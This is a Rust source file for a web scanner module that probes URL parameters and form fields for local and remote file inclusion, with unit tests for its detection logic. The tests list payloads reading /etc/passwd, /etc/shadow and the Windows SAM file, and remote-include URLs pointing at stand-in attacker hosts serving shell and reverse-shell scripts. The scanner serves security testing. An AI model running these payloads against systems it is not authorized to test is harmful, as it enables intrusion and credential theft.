use crate::form::Form;
use crate::rate_limiter::RateLimiter;
use crate::reporter::Reporter;
use indicatif::ProgressBar;
use serde::Deserialize;
use std::collections::HashMap;
use std::sync::Arc;
use url::Url;

#[derive(Debug, Deserialize, Clone)]
pub struct FileInclusionVulnerability {
    pub url: Url,
    pub parameter: String,
    pub payload: String,
    pub vuln_type: String,
}

use std::fs;
use std::io::{self, BufRead};

pub struct FileInclusionScanner<'a> {
    target_urls: Vec<Url>,
    forms: Vec<Form>,
    payloads: Vec<String>,
    reporter: &'a Arc<Reporter>,
    rate_limiter: Arc<RateLimiter>,
}

impl<'a> FileInclusionScanner<'a> {
    pub fn new(
        target_urls: Vec<Url>,
        forms: Vec<Form>,
        reporter: &'a Arc<Reporter>,
        rate_limiter: Arc<RateLimiter>,
    ) -> Self {
        let mut payloads = Vec::new();
        if let Ok(paths) = fs::read_dir("webhunter/wordlists/file_inclusion") {
            for path in paths.flatten() {
                if let Some(extension) = path.path().extension() {
                    if extension == "txt" {
                        if let Ok(file) = fs::File::open(path.path()) {
                            let reader = io::BufReader::new(file);
                            for line in reader.lines().map_while(Result::ok) {
                                payloads.push(line);
                            }
                        }
                    }
                }
            }
        }

        Self {
            target_urls,
            forms,
            payloads,
            reporter,
            rate_limiter,
        }
    }

    pub fn payloads_count(&self) -> usize {
        self.payloads.len()
    }

    pub async fn scan(&self, pb: &ProgressBar) -> Result<(), reqwest::Error> {
        self.scan_urls(pb).await?;
        self.scan_forms(pb).await?;
        Ok(())
    }

    async fn scan_urls(&self, pb: &ProgressBar) -> Result<(), reqwest::Error> {
        let client = reqwest::Client::new();

        for url in &self.target_urls {
            let query_pairs: Vec<(String, String)> = url.query_pairs().into_owned().collect();
            if query_pairs.is_empty() {
                continue;
            }

            'param_loop: for i in 0..query_pairs.len() {
                for payload in &self.payloads {
                    let mut new_query_parts = Vec::new();
                    let mut tested_param = String::new();
                    for (j, (key, value)) in query_pairs.iter().enumerate() {
                        if i == j {
                            new_query_parts.push(format!("{}={}", key, payload));
                            tested_param = key.clone();
                        } else {
                            new_query_parts.push(format!("{}={}", key, value));
                        }
                    }
                    let new_query = new_query_parts.join("&");
                    let mut new_url = url.clone();
                    new_url.set_query(Some(&new_query));

                    self.rate_limiter.wait().await;
                    let response = client.get(new_url.clone()).send().await?;
                    pb.inc(1);
                    if response.status() == reqwest::StatusCode::NOT_FOUND {
                        continue;
                    }
                    if let Ok(body) = response.text().await {
                        if let Some(vuln_type) = self.is_vulnerable(&body, payload) {
                            let vuln = FileInclusionVulnerability {
                                url: url.clone(),
                                parameter: tested_param.clone(),
                                payload: payload.to_string(),
                                vuln_type,
                            };
                            println!(
                                "[+] File Inclusion Found: {} in {}",
                                vuln.payload, vuln.parameter
                            );
                            self.reporter.report_file_inclusion(&vuln);
                            continue 'param_loop;
                        }
                    }
                }
            }
        }
        Ok(())
    }

    async fn scan_forms(&self, pb: &ProgressBar) -> Result<(), reqwest::Error> {
        let client = reqwest::Client::new();

        for form in &self.forms {
            'input_loop: for i in 0..form.inputs.len() {
                for payload in &self.payloads {
                    let mut form_data = HashMap::new();
                    let mut tested_param = String::new();
                    for (j, input) in form.inputs.iter().enumerate() {
                        if i == j {
                            form_data.insert(input.name.clone(), payload.to_string());
                            tested_param = input.name.clone();
                        } else {
                            form_data.insert(input.name.clone(), input.value.clone());
                        }
                    }

                    let action_url = form.url.join(&form.action).unwrap();
                    self.rate_limiter.wait().await;
                    let response = if form.method.to_lowercase() == "post" {
                        client.post(action_url).form(&form_data).send().await?
                    } else {
                        client.get(action_url).query(&form_data).send().await?
                    };

                    pb.inc(1);
                    if response.status() == reqwest::StatusCode::NOT_FOUND {
                        continue;
                    }

                    if let Ok(body) = response.text().await {
                        if let Some(vuln_type) = self.is_vulnerable(&body, payload) {
                            let vuln = FileInclusionVulnerability {
                                url: form.url.clone(),
                                parameter: tested_param.clone(),
                                payload: payload.to_string(),
                                vuln_type,
                            };
                            println!(
                                "[+] File Inclusion Found: {} in {}",
                                vuln.payload, vuln.parameter
                            );
                            self.reporter.report_file_inclusion(&vuln);
                            continue 'input_loop;
                        }
                    }
                }
            }
        }

        Ok(())
    }

    fn is_vulnerable(&self, body: &str, payload: &str) -> Option<String> {
        let lfi_evidence = ["root:x:0:0", "[fonts]", "boot.ini"];
        let rfi_evidence = ["<title>Google</title>", "User-agent: *"];

        if payload.starts_with("http://") || payload.starts_with("https://") {
            for evidence in &rfi_evidence {
                if body.contains(evidence) {
                    return Some("RFI".to_string());
                }
            }
        } else {
            for evidence in &lfi_evidence {
                if body.contains(evidence) {
                    return Some("LFI".to_string());
                }
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;

    fn create_test_scanner() -> FileInclusionScanner<'static> {
        let reporter = Box::leak(Box::new(Arc::new(Reporter::new(
            Url::parse("https://example.com").unwrap(),
        ))));
        let rate_limiter = Arc::new(RateLimiter::new(Duration::from_millis(0)));

        FileInclusionScanner::new(
            vec![], // Empty URLs for unit tests
            vec![], // Empty forms for unit tests
            reporter,
            rate_limiter,
        )
    }

    #[test]
    fn test_is_vulnerable_lfi_linux_passwd() {
        let scanner = create_test_scanner();
        let body =
            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin";
        let payload = "../../../etc/passwd";

        let result = scanner.is_vulnerable(body, payload);
        assert_eq!(result, Some("LFI".to_string()));
    }

    #[test]
    fn test_is_vulnerable_lfi_windows_fonts() {
        let scanner = create_test_scanner();
        let body = "[fonts]\nsize=10\ncolor=blue\n[boot loader]\ntimeout=30";
        let payload = "..\\..\\windows\\win.ini";

        let result = scanner.is_vulnerable(body, payload);
        assert_eq!(result, Some("LFI".to_string()));
    }

    #[test]
    fn test_is_vulnerable_lfi_windows_boot() {
        let scanner = create_test_scanner();
        let body = "[boot loader]\ntimeout=30\ndefault=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\nboot.ini file content here";
        let payload = "..\\..\\boot.ini";

        let result = scanner.is_vulnerable(body, payload);
        assert_eq!(result, Some("LFI".to_string()));
    }

    #[test]
    fn test_is_vulnerable_rfi_google() {
        let scanner = create_test_scanner();
        let body =
            "<!DOCTYPE html><html><head><title>Google</title></head><body>Search</body></html>";
        let payload = "http://google.com";

        let result = scanner.is_vulnerable(body, payload);
        assert_eq!(result, Some("RFI".to_string()));
    }

    #[test]
    fn test_is_vulnerable_rfi_robots() {
        let scanner = create_test_scanner();
        let body = "# robots.txt\nUser-agent: *\nDisallow: /admin\nDisallow: /private";
        let payload = "https://example.com/robots.txt";

        let result = scanner.is_vulnerable(body, payload);
        assert_eq!(result, Some("RFI".to_string()));
    }

    #[test]
    fn test_is_vulnerable_no_evidence() {
        let scanner = create_test_scanner();
        let body = "Welcome to our homepage! This is a normal page with no vulnerabilities.";
        let payload = "../test.txt";

        let result = scanner.is_vulnerable(body, payload);
        assert_eq!(result, None);
    }

    #[test]
    fn test_payload_classification_lfi() {
        let lfi_payloads = vec![
            "../../../etc/passwd",
            "..\\..\\boot.ini",
            "/etc/shadow",
            "../../windows/system32/config/sam",
        ];

        for payload in lfi_payloads {
            assert!(
                !payload.starts_with("http://") && !payload.starts_with("https://"),
                "LFI payload should not start with http: {}",
                payload
            );
        }
    }

    #[test]
    fn test_payload_classification_rfi() {
        let rfi_payloads = vec![
            "http://evil.com/shell.txt",
            "https://attacker.com/reverse.php",
            "http://192.168.1.1/malicious.txt",
        ];

        for payload in rfi_payloads {
            assert!(
                payload.starts_with("http://") || payload.starts_with("https://"),
                "RFI payload should start with http/https: {}",
                payload
            );
        }
    }

    #[test]
    fn test_scanner_creation() {
        let scanner = create_test_scanner();
        // Scanner should be created successfully
        // Payload count might be 0 in test environment if wordlists aren't accessible
        let _count = scanner.payloads_count();
        // Just verify scanner is constructed properly
    }

    #[test]
    fn test_vulnerability_struct_creation() {
        let vuln = FileInclusionVulnerability {
            url: Url::parse("https://example.com/page?file=test").unwrap(),
            parameter: "file".to_string(),
            payload: "../../../etc/passwd".to_string(),
            vuln_type: "LFI".to_string(),
        };

        assert_eq!(vuln.vuln_type, "LFI");
        assert_eq!(vuln.parameter, "file");
        assert_eq!(vuln.payload, "../../../etc/passwd");
        assert_eq!(vuln.url.as_str(), "https://example.com/page?file=test");
    }

    #[test]
    fn test_multiple_lfi_evidence_patterns() {
        let scanner = create_test_scanner();

        let test_cases = vec![
            (
                "root:x:0:0:root:/root:/bin/bash",
                "../etc/passwd",
                Some("LFI"),
            ),
            ("[fonts]\nMS Sans Serif=8", "..\\win.ini", Some("LFI")),
            (
                "boot.ini\n[boot loader]\ntimeout=30",
                "..\\boot.ini",
                Some("LFI"),
            ),
            ("No evidence here", "../test", None),
        ];

        for (body, payload, expected) in test_cases {
            let result = scanner.is_vulnerable(body, payload);
            assert_eq!(
                result.as_deref(),
                expected,
                "Failed for payload: {} with body containing: {}",
                payload,
                &body[..20.min(body.len())]
            );
        }
    }

    #[test]
    fn test_multiple_rfi_evidence_patterns() {
        let scanner = create_test_scanner();

        let test_cases = vec![
            ("<title>Google</title>", "http://google.com", Some("RFI")),
            (
                "User-agent: *\nDisallow: /",
                "https://example.com/robots.txt",
                Some("RFI"),
            ),
            ("Normal page content", "http://test.com", None),
        ];

        for (body, payload, expected) in test_cases {
            let result = scanner.is_vulnerable(body, payload);
            assert_eq!(
                result.as_deref(),
                expected,
                "Failed for RFI payload: {}",
                payload
            );
        }
    }
}
